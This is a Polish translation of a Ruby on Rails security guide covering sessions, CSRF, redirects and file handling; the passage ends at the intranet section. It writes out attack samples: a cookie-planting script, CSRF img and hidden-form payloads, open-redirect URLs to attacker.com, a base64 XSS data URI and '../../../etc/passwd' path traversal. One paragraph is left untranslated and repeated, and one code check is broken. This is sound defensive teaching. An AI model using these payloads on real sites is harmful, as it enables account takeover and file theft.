Bezpieczeństwo w Ruby On Rails
================================
 
Ten przewodnik opisuje częste problemy związane z bezpieczeństwem w aplikacjach internetowych i pokazuje jak ich uniknąć stosując Railsy. Jeśli masz jakiekolwiek pytania lub sugestie, wyślij wiadomość do Heiko Webers'a na maila: 42 {_et_} rorsecurity.info. Po przeczytaniu tego przewodnika powinieneś znać takie zagadnienia jak:

- Wszystkie [,#fffcdb]#najistotniejsze sposoby obrony#
- Sesje w Railsach, jak są obsługiwane, co można w nich przechowywać oraz jak mogą być atakowane
- Jak zwykłe odwiedzenie witryny może stać się problemem związanym z bezpieczeństwem (przez atak CSRF)
- Na co musisz zwracać uwagę przy pracy z plikami lub dostarczaniu interfejsu administracyjnego
- Swoisty dla Railsów problem z masowym przypisaniem
- Jak zarządzać użytkownikami: logowanie, wylogowanie i metody ataku na wszystkich poziomach.
- I najbardziej popularne metody ataku typu injection

== Wstęp

Frameworki powstały by pomagać projektantom w tworzeniu aplikacji internetowych. Niektóre z nich mogą być pomocne także przy ochronie aplikacji przed atakami. W rzeczywistości wszystkie frameworki są tak samo bezpieczne: jeśli stosujesz je prawidłowo będziesz w stanie stworzyć bezpieczne aplikacje używając niemalże każdego z frameworków. W Ruby on Rails można znaleźć kilka helperów rozwiązujących takie problemy jak np. ataki typu injection. Z przyjemnością muszę stwierdzić, że wszystkie Railsowe aplikacje, które audytowałem miały wysoki poziom bezpieczeństwa.

Ogólnie rzecz biorąc nie ma sposobu na zapewnienie natychmiastowej ochrony aplikacji przed wszystkimi rodzajami ataku. Bezpieczeństwo zależy od ludzi używających frameworka, od metody projektowania jak również od wszystkich poziomów środowiska aplikacji internetowej: silnika aplikacji, serwera, lub aplikacji samej w sobie (i prawdopodobnie od innych poziomów aplikacji).

Gartner Group oszacowała jednak, że 75% ataków dotyczy poziomu aplikacji internetowej. Okazało się, „że spośród 300 audytowanych stron 97% było narażonych na atak”. Dzieje się tak dlatego, ponieważ aplikacje internetowe są stosunkowo łatwym celem ataku. Nawet laik bez trudu może zrozumieć ich działanie i w prosty sposób nimi manipulować.

Zagrożenia wobec aplikacji internetowych to między innymi: przejęcie konta użytkownika, ominięcie kontroli dostępu, czytanie lub modyfikowanie poufnych danych, prezentacja fałszywych treści. Atakujący może również zainstalować konia trojańskiego, lub oprogramowanie rozsyłające niepożądane maile w celu uzyskania korzyści finansowych lub w celu zniszczenia dobrego imienia firmy poprzez modyfikację cennych materiałów. Jeśli chcesz zapobiegać atakom, zminimalizować ich działanie i wyeliminować potencjalne miejsca, w których mógłby nastąpić atak, musisz najpierw w pełni zrozumieć metody ataku. I to właśnie jest celem tego przewodnika.

W celu rozwoju bezpiecznej aplikacji internetowej musisz aktualizować wszystkie jej poziomy i poznać swoich wrogów. Żeby być na bieżąco z aktualnymi informacjami o bezpieczeństwie dopisz się do odpowiednich list mailingowych, czytaj blogi i postaraj się, żeby aktualizowanie i kontrolowanie bezpieczeństwa Twojej aplikacji weszło Ci w nawyk (sprawdź w rozdziale „Dodatkowe materiały”). Ja robię to ręcznie ponieważ to najlepszy sposób, żeby znaleźć złośliwe problemy związane z bezpieczeństwem.

== Sesje
 
Rozważając kwestię bezpieczeństwa dobrze zwrócić uwagę na sesje, które mogą być szczególnie narażone na ataki.
 
=== Czym są sesje?
 
-- _HTTP jest bezstanowym protokołem. Sesje to zmieniają._
 
Większość aplikacji wymaga śledzenia stanu danego użytkownika. Może to dotyczyć zawartości koszyka zakupów lub ID aktualnie zalogowanego użytkownika. Gdyby nie sesje, użytkownik musiałby identyfikować się i uwierzytelniać przy każdej podejmowanej akcji. 
Railsy tworzą nową sesję automatycznie, w chwili gdy użytkownik zaczyna korzystać z  nowej aplikacji. W przypadku gdy użytkownik korzystał już z aplikacji, wczytywana jest istniejąca sesja.
 
Sesja zwykle składa się z tablicy asocjacyjnej wartości i identyfikatora sesji. Zwykle jest to 32-znakowy łańcuch do określenia tablicy asocjacyjnej. Każde cookie wysłane do przeglądarki klienta zawiera identyfikator sesji. I odwrotnie: przeglądarka wysyła je do serwera, na każde żądanie klienta. W Railsach można zapisać i pobrać wartości używając metody sesji:
 
[source, ruby]
----------------------------------------------------------------------------
session[:user_id] = @current_user.id
User.find(session[:user_id])
----------------------------------------------------------------------------
 
=== Identyfikator sesji
 
-- _The session id is a 32 byte long MD5 hash value._

-- _Identyfikator sesji jest 32 bajtową wartością hash MD5._

Identyfikator sesji składa się z wartości hash losowego ciągu znaków. Losowy ciąg znaków to aktualny czas, losowa liczba między 0 a 1, id procesu interpretera Ruby (również po prostu losowa liczba) i stały ciąg znaków. Obecnie atak typu brute-force na ID sesji w Railsach jest niemożliwy. Do tej pory MD5 był bezkonkurencyjny, jednak znaleziono sposób na generowanie kolizji. Oznacza to, że różne dane wejściowe mogą mieć taką samą wartość hash. Jednak nie ma to żadnego wpływu na bezpieczeństwo daty.
 
=== Przechwytywanie sesji

-- _Kradzież identyfikatora sesji użytkownika pozwala atakującemu umożliwia atakującemu dostęp do danej aplikacji internetowej, tak, jakby korzystał z niej pełnoprawny użytkownik._

Wiele aplikacji internetowych ma następujący system uwierzytelniania: użytkownik wprowadza nazwę użytkownika i hasło, aplikacja sprawdza dane i przechowuje identyfikator sprawdzonego użytkownika w tablicy asocjacyjnej sesji. Od tej chwili sesja jest ważna. Na każde żądanie aplikacja wczyta użytkownika o danym identyfikatorze użytkownika bez potrzeby uwierzytelniania. Identyfikator sesji jest odpowiedzialny za identyfikacje sesji.

Stąd wynika, że cookies są wykorzystwane do tymczasowego uwierzytelniania w aplikacjach internetowych. Każdy kto przejmie czyjeś cookies, może używać aplikacji jako ten użytkownik - co może powodować poważne konsekwencje. Oto kilka sposobów na przejęcie sesji i sposoby obrony przed atakiem:
 
- Wywęszenie cookies w niezabezpieczonej sieci. Bezprzewodowa sieć może posłużyć jako przykład takiej sieci. W nieszyfrowanej sieci bezprzewodowej śledzenie ruchu wszystkich podłączonych klientów jest szczególnie łatwe. Jest to jeden z powodów, dla których powinniśy zrezygnować z pracy w kawiarniach. Dla projektantów aplikacji internetowych oznacza to [,#fffcdb] #konieczność zapewnienia bezpiecznego połączenia przez SSL#.
 
- Większość ludzi nie kasuje cookies po pracy na publicznym sprzęcie. Więc jeśli ostatni użytkownik nie wylogował się z aplikacji internetowej, ktoś inny może się pod niego podszywać. Dlatego ważne jest, aby zapewnić użytkownikowi [,#fffcdb]#widoczny przycisk do wylogowania#.
 
- Wiele ataków typu cross-site scripting (XSS) ma na celu pozyskanie cookies użytkownika. Więcej informacji o atakach typu XSS znajduje się w dalszej części podręcznika.
 
- Atakujący może spreparować ID sesji użytkownika zamiast kradzieży nieznanych cookies. Więcej informacji o atakach typu session fixation znajduje się w dalszej części podręcznika.
 
Głównym celem większości atakujących jest korzyść finansowa. Ceny za skradzione loginy do kont bankowych na czarnym rynku są wyceniane od 10 do 1000 dolarów (w zależności od środków na koncie). Numery kart kredytowych są warte od 0,40 do 20 dolarów. Za konta na stronach z aukcjami online – 1 do 8 dolarów. Hasła do kont mailowych kosztują od 4 do 30 dolarów. Dane pochodzą ze strony: http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf[Symantec Global Internet Security Threat Report]. 
 
=== Wskazówki dotyczące sesji
 
-- _Kilka ogólnych wskazówek dotyczących sesji._
  
- Nie przechowuj dużych obiektów w sesji. Zamiast tego powinieneś przechowywać je w bazie danych i zapisywać ich ID w sesji. Rozwiążesz w ten sposób problemy z synchronizacją i nie zapełnisz miejsca w sesji (w zależności od tego jaką pojemność wybrałeś, patrz poniżej).  

- [,#fffcdb]#Ważne dane nie powinny być przechowywane w sesjach#. Gdy użytkownik wyczyści cookies albo zamknie przeglądarkę nie będzie mógł ich odzyskać. Przechowując dane w sesji po stronie klienta, użytkownik będzie mógł z nich korzystać. 
 
=== Session storage
 
-- _Railsy zapewniają kilka mechanizmów przechowywania hashów sesji wartości. Najważniejszymi z nich są ActiveRecordStore i CookieStore._
 
Można wymienić wiele sposobów przechowywania sesji, np. gdy Railsy zapisują hash i id sesji. Większość aplikacji typu Real-live korzysta z ActiveRecordStore (lub jej pochodnych). ActiveRecordStore przechowuje hash i id sesji w tabeli w bazie danych. Hash jest zapisywany i wczytywany na każde żądanie.

W Railsach 2 wprowadzono nowy domyślny sposób przechowywania sesji - CookieStore. CookieStore zapisuje hash sesji bezpośrednio w cookie po stronie klienta, skąd wczytywany jest przez serwer. Dzięki temu id sesji staje się zbędne, a aplikacja działa dużo szybciej. Jednak jest to dość kontrowersyjny sposób przechowywania i trzeba wziąć pod uwagę kilka kwestii związanych z bezpieczeństwem tego sposobu:
  
- Rozmiar cookies nie może przekraczać 4K. Jest to w porządku, jednak nie powinno się przechowywać w cookies dużej ilości danych, odwołując się do tego co napisałem wcześniej. [,#fffcdb]#Przechowywanie id bazy danych danego użytkownika jest dobrym rozwiązaniem#.

- Użytkownik może zobaczyć wszystko co przechowujesz w sesji, ponieważ przechowywane dane są w postaci tekstowej (właściwie są one zakodowane w Base64, ale nie szyfrowane) Więc zapewne [,#fffcdb]#nie chciałbyś przechowywać tu żadnych sekretnych danych#. Żeby zapobiec manipulacji hasha sesji, skrót jest wyliczany na podstawie sesji z tajnym kluczem (secret) po stronie serwera i umieszczany na końcu pliku cookie.
 
Oznacza to, że bezpieczeństwo przechowywania jest zależne od tajnego klucza (I od algorytmu funkcji skrótu, którym domyślnie jest, jak do tej pory niezastąpiony, SHA512). Więc [,#fffcdb]#nie używaj prostych kluczy takich jak słowa ze słownika, lub kluczy poniżej 30 znaków#. Umieść swój tajny klucz w environment.rb:
 
....................................
config.action_controller.session = {
  :key         => ‘_app_session’,
  :secret      => ‘0x0dkfj3927dkc7djdh36rkckdfzsg...’
}
....................................
 
Istnieją jednak, pochodne CookieStore które szyfrują hash sesji, więc klient nie może go zobaczyć.
 
=== Ataki typu Replay na sesje CookieStore.
 
-- _Kolejnym sposobem ataku, którego powinieneś się obawiać gdy używasz CookieStore, jest atak typu replay._

Wygląda to tak:
 
- Użytkownik otrzymuje kredyty, kwota jest przechowywana w sesji (co jest złym pomysłem, ale użyłem tego przykładu dla celów demonstracyjnych). 
- Użytkownik kupuje jakiś przedmiot. 
- Jego nowy, niższy kredyt będzie przechowywany w sesji. 
- Ciemna strona mocy użytkownika każe mu wziąć cookie z pierwszego kroku (które wcześniej skopiował) i zastąpić obecne cookie w przeglądarce. 
- Użytkownik ma swój kredyt z powrotem.
 
Zastosowanie nonce (losowa wartość) w sesji rozwiązuje problem ataku typu replay. Nonce jest ważna tylko raz i serwer musi śledzić wszystkie ważne nonce. To staje się jeszcze bardziej skomplikowane, jeśli twoja aplikacja znajduje się na kilku serwerach (mongrels). Przechowywanie nonce w tabeli bazy danych niszczy całą ideę CookieStore (unikanie łączenia się z bazą danych).
 
Najlepszym [,#fffcdb]#rozwiązaniem jest przechowywanie tego rodzaju danych nie w sesji, lecz w bazie danych#. W tym przypadku kredyt powinien być przechowywany w bazie danych, a id_zalogowanego_użytkownika (logged_in_user_id) w sesji.
=== Atak typu Session fixation
 
-- _Oprócz kradzieży identyfikatora sesji użytkownika, atakujący może spreparować identyfikator sesji dla użytkownika. Zjawisko to jest określane mianem ataku typu session fixation.
 
image::images/session_fixation.png[Session fixation]
 
Ten atak skupia się na spreparowaniu identyfikatora sesji dla użytkownika, który jest znany atakujący i zmuszeniu użytkownika do korzystania z tego identyfikatora. Zatem atakujący nie musi później kraść identyfikatora sesji. Oto jak działa ten atak:
 
. Atakujący tworzy ważny identyfikator sesji: Ładuje stronę logowania aplikacji internetowej (która ma być obiektem ataku typu session fixation), i pozyskuje identyfikator sesji, wysłany w odpowiedzi z serwera w pliku cookie (patrz nr 1 i 2 na obrazku).
 
. Atakujący prawdopodobnie będzie kontynuował sesję. Wygasanie sesji, na przykład co 20 minut, znacznie skraca czas przewidziany dla ataku. Dlatego atakujący co jakiś czas otwiera aplikację internetową, żeby podtrzymać sesję.
 
. Teraz atakujący może zmusić przeglądarkę użytkownika do korzystania z jego identyfikatora sesji (patrz nr 3 na obrazku). Ponieważ nie można zmienić cookie innej domeny (z powodu zasady tożsamego pochodzenia - same origin policy), atakujący musi uruchomić JavaScript z domeny docelowej aplikacji internetowej. Wdrożenie (Injection) własnego kodu JavaScript do aplikacji będącej obiektem ataku jest możliwe dzięki takim metodom jak XSS. Oto przykład: 
+<script> document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9"; </script>+
Więcej informacji o atakach typu XSS i Injection znajduje się w dalszej części podręcznika.
  
. Atakujący wabi ofiary do stron zainfekowanych kodem JavaScript. Przeglądając stronę, przeglądarka ofiary zmienia identyfikator sesji na identyfikator sesji-pułapki.
 
. Ponieważ nowa sesja-pułapka nie była do tej pory nieużywana, aplikacja internetowa będzie wymagać uwierzytelnienia użytkownika. 
 
. Od tej pory, ofiara i atakujący będą wspólnie używać aplikacji internetowej, korzystając z tej samej sesji: Sesja stała się ważna, a ofiara nie zauważyła ataku.
 
=== Sposoby obrony przed atakiem typu session fixation
 
-- _Jedna linia kodu może ochronić Cię przed atakiem typu session fixation._
  
Najskuteczniejszą ochroną jest [,#fffcdb]#wydanie nowego identyfikatora sesji# i zadeklarowanie starego jako nieważnego po udanym logowaniu. W ten sposób atakujący nie może używać spreparowanych identyfikatorów sesji. Jest to również dobry sposób obrony przeciw przejęciu sesji. Oto jak utworzyć nową sesję w Railsach:

[source, ruby]
----------------------------------------------------------------------------
reset_session
----------------------------------------------------------------------------
 
W przypadku korzystania z popularnej wtyczki RestfulAuthentication do zarządzania użytkownikami, należy dodać reset_session do akcji SessionsController#create. Zwróć uwagę, że ta akcja usuwa wszystkie wartości z sesji, [,#fffcdb]# więc musisz przenieść je do nowej sesji#.
  
Innym sposobem obrony jest [,#fffcdb]#zapisywanie specyficznych właściwości użytkownika w sesji#, weryfikowanie ich przy każdym żądaniu i odmowa dostępu, jeśli informacje te nie pasują do siebie. Takimi właściwościami mogą być adres IP lub user agent (nazwa przeglądarki internetowej), choć ta ostatnia nie jest aż tak bardzo charakterystyczna dla użytkownika. Podczas zapisywania adresu IP, musisz pamiętać, że istnieją dostawcy usług internetowych oraz duże organizacje, które oferują swoim użytkownikom dostęp do Internetu przez proxy. [,#fffcdb]# Adresy IP tych użytkowników mogą ulegać zmianom w trakcie sesji#, więc nie będą oni mogli korzystać z aplikacji, lub tylko w ograniczonym zakresie.

=== Wygasanie sesji

_Sesja, która nigdy nie wygasa daje więcej czasu atakującym na przeprowadzenie ataku typu cross-site reference forgery (CSRF), przechwytywanie sesji i session fixation._
 
Jedną z możliwości jest ustawienie czasu wygaśnięcia cookie przechowującego id sesji. Jednak klient może edytować pliki cookies, które są przechowywane w przeglądarce internetowej tak, żeby wygasające sesje na serwerze były bezpieczniejsze. Oto przykład, jak [,#fffcdb]#ustawić wygasanie sesji w tabeli bazy danych#. Session.sweep(„20m”) powoduje wygaśnięcie sesji, które były używane wcześniej niż 20 minut temu.
 
[source, ruby]
----------------------------------------------------------------------------
class Session < ActiveRecord::Base
 def self.sweep(time_ago = nil)
     time = case time_ago
       when /^(\d+)m$/ then Time.now - $1.to_i.minute
       when /^(\d+)h$/ then Time.now - $1.to_i.hour
       when /^(\d+)d$/ then Time.now - $1.to_i.day
       else Time.now - 1.hour
     end
     self.delete_all "updated_at < '#{time.to_s(:db)}'"
   end
 end
----------------------------------------------------------------------------

W Sekcji na temat ataku typu session fixation zapoznaliśmy się problemem utrzymania sesji. Atakujący odświeżając sesję co pięć minut jest w stanie bez końca utrzymywać sesję przy życiu, mimo tego, że sesja użytkownika już wygasła. Prostym rozwiązaniem tego problemu może być dodanie kolumny created_at do tabeli sesji. W ten sposób możesz usunąć sesje, które zostały stworzone dawno temu. Dodaj tą linię kodu, do metody, która opisałem powyżej:
 
[source, ruby]
----------------------------------------------------------------------------
self.delete_all "updated_at < '#{time.to_s(:db)}' OR created_at < '#{2.days.ago.to_s(:db)}'"
----------------------------------------------------------------------------

-- _Ta metoda ataku dodaje złośliwy kod lub link na stronie internetowej, która jest odpowiedzialna za dostęp do aplikacji, w taki sposób że użytkownikowi wydaje się, że został uwierzytelniony. Jeśli sesja dla tej aplikacji nie wygasła, atakujący może bezprawnie wykonywać polecenia._
 
image::images/csrf.png[CSRF]
 
W rozdziale o sesjach dowiedzieliśmy się, że większość aplikacji Railsowych wykorzystuje sesje oparte na cookies. Każda z nich przechowuje identyfikator sesji w pliku cookie i hash sesji trzymaja po stronie serwera, lub też cały hash sesji przechowuje po stronie klienta. We wszystkich przypadkach przeglądarka, na każde żądanie, automatycznie przesyła dalej cookie do domeny, oczywiście jeśli może odnaleźć cookie dla danej domeny. Zagrożeniem może być fakt, że przeglądarka będzie również wysłać plik cookie, jeśli żądanie przyjdzie ze strony na innej domenie. Zacznijmy od przykładu:
 
- Bob przegląda forum i widzi wpis (post) hakera, zawierający spreparowany element HTML typu img (obrazek). Element odnosi się raczej do komendy w aplikacji zarządzania projektem Boba, zamiast obrazka. 
- +<img src="http://www.webapp.com/project/1/destroy">+
- Sesja Bob na www.webapp.com jest wciąż aktywna, bo nie wylogował się kilka minut temu. 
- Poprzez oglądanie wpisu, przeglądarka znajdzie tag obrazka. Następnie spróbuje wczytać podejrzany obrazek z www.webapp.com. Zgodnie z tym, co napisałem wcześniej, przeglądarka prześle również cookie z ważnym identyfikator sesji. 
- Aplikacja internetowa na www.webapp.com sprawdzi informacje o użytkowniku w odpowiednim hashu sesji i zniszczy projekt z ID 1. Następnie zwróci stronę, która będzie nieoczekiwanym wynikiem dla przeglądarki, więc nie wyświetli się żaden obrazek. 
- Bob nie zauważy ataku -- ale po kilku dniach stwierdzi, że projekt numer 1 zniknał.
 
Ważne jest, aby zauważyć, że spreparowany obrazek lub link nie koniecznie musi znajdować się na domenie, gdzie znajduje się aplikacja - może być w dowolnym miejscu - na forum, blogu lub w mailu. 
 
CSRF pojawia się bardzo rzadko w CVE (Common Vulnerabilities and Exposures) -- mniej niż 0,1% w 2006 r. -- ale tak naprawdę jest to "śpiący olbrzym" [Grossman]. Kontrastuje to znacząco z wynikami moich (i innych) zleceń dotyczących pracy z bezpieczeństwem - [,#fffcdb]#CSRF jest ważną kwestią bezpieczeństwa#.

=== Sposoby ochrony przed atakiem typu CSRF 

-- _Po pierwsze, jak to jest wymagane przez W3C, używaj odpowiednio GET i POST. Po drugie, używaj tokena zabezpieczającego przy metodach non-GET, żeby chronić aplikację przed CSRF.

Protokół HTTP przewiduje zasadniczo dwa główne rodzaje wniosków - GET i POST (i więcej, ale nie są one obsługiwane przez większość przeglądarek). World Wide Web Consortium (W3C) podaje spis sytuacji, w których stosujemy GET lub POST:
 
*Używaj GET jeśli:*

- Interakcja przypomina [,#fffcdb]#zapytanie# (np. jeśli jest to bezpieczna operacja taka jak kwerenda (query), operacja czytania (read operation), albo wyszukiwania (lookup).
 
*Używaj  POST jeśli:*
 
- Interakcja przypomina [,#fffcdb]#komendę#, lub
- Interakcja [,#fffcdb]#powoduje zmianę# zasobów w sposób zauważalny dla użytkownika (np. subskrypcja serwisu), lub
- Użytkownik [,#fffcdb]#jest odpowiedzialny za wynik działania# interakcji.

Jeśli aplikacja internetowa jest RESTful, możesz również korzystać z dodatkowych  metod HTTP, takich jak PUT lub DELETE. Większość współczesnych przeglądarek internetowych ich nie obsługuje, jednak Railsy wykorzystują ukryte pole +_method+, żeby ominąć tą barierę.
 
[,#fffcdb]#Sprawdzanie metody (verify method) w kontrolerze sprawdza czy konkretne akcje nie mogą być wykorzystywane przez GET#. Oto przykład, w którym sprawdzane jest wykorzystanie akcji transferu przez POST. Jeżeli akcja jakiejkolwiek innej metody HTTP, zostaje ona przekierowana do listy akcji.
 
.................................................................................
verify :method => :post, :only => [:transfer], :redirect_to => {:action => :list}
.................................................................................

Dzięki tej ostrożności, wyżej opisany atak nie zadziała, ponieważ przeglądarka wysyła żądanie GET dla obrazków, które nie zostanie zaakceptowane przez aplikację internetową. 
 
Ale to dopiero pierwszy krok, ponieważ [,#fffcdb]#żądanie POST również może być wysłane automatycznie#. Oto przykład linku, który wyświetla www.harmless.com jako miejsce docelowe w pasku statusu przeglądarki. W rzeczywistości to dynamicznie tworzy nowy formularz, który wysyła żądanie POST.
 
[source, html]
----------------------------------------------------------------------------
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
----------------------------------------------------------------------------

Atakujący może też umieścić kod w zdarzeniu onmouseover dla obrazka:
 
+<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />+
 
Istnieje wiele innych możliwości (w tym Ajax) ataku ofiary w tle.  [,#fffcdb]#Rozwiązaniem tego problemu może być użycie tokena zabezpieczającego w żądaniach typu non-GET# sprawdzanego po stronie serwera. W Rails 2 lub wyższym, jest to jedna linia kodu w kontrolerze aplikacji: 
 
+protect_from_forgery :secret => "123456789012345678901234567890..."+
 
Spowoduje to automatyczne dołączenie zabezpieczenia tokena, wyliczonego na podstawie bieżącej sesji i tajnego klucza (secret), we wszystkich formularzach i żądaniach Ajaxowych generowanych w Railsach. Klucz (secret) nie będzie potrzebny, jeśli używasz CookieStorage jako ze sposobu przechowywania sesji. Aplikacja wyrzuci błąd ActionController::InvalidAuthenticityToken jeśli token nie będzie poprawny.
 
Należy pamiętać, że [,#fffcdb]#atak typu cross-site scripting (XSS) omija wszystkie zabezpieczenia przed atakami typu CSRF#. XSS pozwala atakującemu na dostęp do wszystkich elementów na stronie, także może on odczytać token zabezpieczający przed CSRF z formularza lub bezpośrednio wysłać formularz. Więcej informacji o atakach typu XSS znajduje się w dalszej części podręcznika.
 
== Przekierowania i pliki

Inną grupą elementów podatnych na atak są przekierowania i pliki w aplikacjach internetowych.
 
=== Przekierowania
 
-- _Przekierowanie w aplikacji internetowej to niedoceniane narzędzie krakingu: Atakujący może zarówno weprowadzić użytkownika na stronę-pułapkę, jak i przygotować niezależny atak._
 
Każdy przypadek, gdy użytkownik ma możliwość rozwinięcia linku (jego części) do przekierowania, stanowi prawdopodobne zagrożone. Najbardziej oczywisty atak to przekierowanie użytkowników do fałszywych stron, które wyglądają dokładnie jak oryginalne. Ten atak (typu phishing) działa poprzez wysłanie zwyczajnie wyglądających linków w wiadomości e-mai, injecting the link by XSS in the web application or umieszczanie linków do innych stron. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to= www.attacker.com. Here is an example of a legacy action:

Nie wygląda to podejrzanie, ponieważ URL zaczyna się jak link do zwyczajnej, niegroźnej strony internetowej, a URL do strony, z której płynie zagrożenie, jest ukryty w parametrze przekierowania: http://www.example.com/site/redirect?to= www.attacker.com. Oto przykład akcji dziedziczenia (legacy action):
 
[source, ruby]
----------------------------------------------------------------------------
def legacy
  redirect_to(params.update(:action=>'main'))
end
----------------------------------------------------------------------------

Będzie ona przekierowywać użytkownika do głównej akcji, jeśli próbował uzyskać dostęp do akcji dziedziczenia. Naszym zamiarem było zabezpieczenie parametrów w adresach URL w akcji dziedziczenia i przekazanie ich do głównej akcji. Jednakże może to być wykorzystane przez atakującego, jeśli zawrze on klucz hosta adresie URL:
 
+http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com+
 
Jeśli jest on na końcu adresu URL, ciężko go zauważyć i przekierowuje użytkownika do hosta attacker.com. Prostą ochroną byłoby [#,fffcdb]#zawieranie tylko oczekiwanych parametrów akcji dziedziczenia# (biała lista (whitelist) uchodzi za alternatywę dla usuwania nieoczekiwanych parametrów). [#,fffcdb]#Każde przekierowanie do adresu URL, należy sprawdzać z białą listą lub dozwolonymi wyrażeniami regularnymi#. 
 
==== Niezależny atak typu XSS
 
Kolejnymi atakami są przekierowywania i niezależny atak XSS działające w przeglądarkach Firefox i Opera przez wykorzystanie protokołu danych. Protokół ten wyświetla swoją zawartość bezpośrednio w przeglądarce i może mieć postać wszystkiego - od kodu HTML lub JavaScript do całego zdjęcia: 

+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K+
 
W tym przykładzie został użyty zaszyfrowany, metodą Base64, kod JavaScript, który wyświetla proste okno dialogowe. W przekierowaniu URL, atakujący może przekierować użytkownika na adres URL ze złośliwym kodem. Żeby bronić się przed takimi atakami, [#,fffcdb]#nie powinieneś pozwalać użytkownikowi na przekierowania (części) adresu URL#.
 
=== Wysyłanie (upload) plików
 
-- _Upewnij się, że pliki wysyłane na serwer nie nadpiszą ważnych plików i że są one przetwarzane asynchronicznie._

Wiele aplikacji internetowych pozwala użytkownikowi na wysyłanie własnych plików. [,#fffcdb]#Nazwy plików, które wybierze użytkownik zawsze powinny być filtrowane# ponieważ atakujący może użyć złośliwych nazw plików, żeby nadpisać ważne pliki na serwerze. Jeśli przechowujesz wczytane pliki w katalogu /var/www/uploads i jeśli użytkownik wyśle plik o nazwie „../../../etc/passwd”, może nadpisać któryś z ważnych plików. Oczywiście interpreter Ruby wymaga odpowiednich praw, żeby to zrobić – kolejny powód, żeby odpalać serwery, serwery baz danych i inne programy jako mniej uprzywilejowany użytkownik Unixowy. 
 
Gdy filtrujesz pliki nadesłane przez użytkownika, [,#fffcdb]#nie staraj się usunąć złośliwych części#. Pomyśl o sytuacji, gdy aplikacja internetowa usuwa wszystkie “../” w nazwie pliku, a atakujący użyje takiej nazwy: “....//” – rezultat będzie taki: “../”. Najlepszym rozwiązaniem będzie stworzenie białej listy, dzięki której [,#fffcdb]# będzie można sprawdzić czy nazwa pliku zawiera dozwolone znaki#. Jest to alternatywa dla czarnej listy, która ma za zadanie usuwać niedozwolone znaki. W przypadku, gdy nazwa jest niepoprawna odrzuć ją (lub zastąp niedozwolone znaki), ale nie usuwaj jej. Pod tym likniem znajdziesz przydatne narzędzie do obsługi nazw plików: http://github.com/technoweenie/attachment_fu/tree/master[attachment_fu plugin]:
 
[source, ruby]
----------------------------------------------------------------------------
def sanitize_filename(filename)
  returning filename.strip do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.gsub! /^.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
----------------------------------------------------------------------------

Znaczna niekorzyść synchronicznego przetwarzania wczytywania plików (jak np. plugin attachment_fu może zrobić z obrazami), jest jego [#,fffcdb]#podatność na ataki typu danial-of-service#. Atakujący może synchronicznie rozpocząć wysyłanie obrazka z wielu komputerów, co zwiększa obciążenie serwera i może prowadzić do awarii serwera. 

Najlepszym rozwiązaniem jest [#,fffcdb]#asynchroniczne przetwarzanie plików (w szczególności obrazków i filmów)#: Zapisz plik i ustaw harmonogram przetwarzania żądania w bazie danych. Drugi proces zajmie się przetwarzaniem plików w tle. 
 
=== Wykonywalny kod we wczytywanych plikach

-- _Kod źródłowy we wczytywanych plikach może być wykonywany, gdy umieszczony jest w konkretnych katalogów. Nie należy umieszczać wczytywanych plików w Rails / katalog publiczny, jeżeli jest katalog domowy Apache._ 

Popularny serwer Apache posiada opcję o nazwie DocumentRoot. Jest to katalog domowy strony internetowej. Wszystko w tym drzewie katalogów będzie obsługiwane przez serwer WWW. Jeśli istnieją pliki o określonych rozszerzeniach, kod zostanie wykonany, jeśli przyjdzie żądanie (może wymagać niektórych opcji do ustalenia). Przykładem mogą być pliki PHP i CGI. Teraz pomyśl o sytuacji, gdy atakujący wysyła na serwer plik "file.cgi" zawierający kod, który zostanie wykonany, gdy ktoś pobiera plik.
 
[,#fffcdb]#Jeśli DocumentRoot w Apache odnosi się do katalogu Rails' /public directory, nie umieszczaj w nim wczytywanych plików#, przechowuj pliki co najmniej jeden poziom niżej.
 
=== Ściąganie plików

-- _Upewnij się, czy użytkownicy nie mogą pobierać dowolnych plików._

Tak ja to było przy wysyłaniu plików na serwer, musisz filtrować nazwy plików przy pobieraniu. Metoda send_file() wysyła pliki z serwera do klienta. Jeśli używana jest nazwa pliku wpisywana użytkownika, bez filtrowania, można pobrać każdy plik:
 
[source, ruby]
----------------------------------------------------------------------------
send_file('/var/www/uploads/' + params[:filename])
----------------------------------------------------------------------------

Wystarczy podać nazwę pliku, taką jak "../../../etc/passwd" żeby pobrać dane do logowania serwera. Prostym rozwiązaniem jest [#,fffcdb]#sprawdzenie czy żądany plik znajduje się w tym katalogu, w którym się spodziewasz#:
 
[source, ruby]
----------------------------------------------------------------------------
basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename =!
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, :disposition => 'inline'
----------------------------------------------------------------------------

Inny (dodatkowy) sposób to przechowywanie nazw plików w bazie danych i nazywanie plików na dysku według identyfikatorów w bazie danych. Jest to również dobry sposób, żeby uniknąć problemu kodu w nazwach wysyłanych plików. Wtyczka attachment_fu działa w podobny sposób.
 
== Ochrona Intranetu I nardzędzi administracyjnych
  
-- _Intranet i interfejsy administracyjne są popularnymi celami ataku, ponieważ umożliwiają one uprzywilejowany dostęp. Mimo to wymagają kilku dodatkowych środków bezpieczeństwa, odwrotnie jest w rzeczywistym świecie._

